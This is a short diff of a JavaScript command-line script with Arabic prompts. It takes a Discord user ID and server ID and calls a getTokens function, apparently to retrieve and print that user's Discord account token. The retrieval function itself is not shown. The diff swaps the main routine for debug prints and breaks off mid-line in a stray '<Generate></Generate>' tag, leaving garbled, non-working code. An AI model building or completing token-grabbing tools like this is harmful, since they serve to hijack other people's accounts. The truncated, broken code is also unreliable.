@@ -30,21 +30,6 @@ async function getTokens(user_id, guild_id) {
 
 async function main() {
     rl.question("أدخل ID المستخدم: ", (user_id) => {
-        rl.question("أدخل ID الخادم: ", async (guild_id) => { // تأكد من أن النص هنا مكتمل
-            try {
-                const token = await getTokens(user_id, guild_id);
-                if (token) {
-                    console.log(`[+] توكن ديسكورد: ${token}`);
-                } else {
-                    console.log("[-] فشل الحصول على التوكن.");
-                }
-            } catch (error) {
-                console.log("[-] صار خطأ:", error);
-            } finally {
-                rl.close();
-            }
-        }); // تأكد من أن القوس مغلق هنا
-    }); // تأكد من أن القوس مغلق هنا
-}
-
-main();
+        console.log(`تم إدخال ID المستخدم: ${user_id}`); // رسالة تصحيح
+        rl.question("أدخل ID الخادم: ", async (guild_id) => {
+            console.log(`تم إدخال ID الخادم: ${ <Generate></Generate>
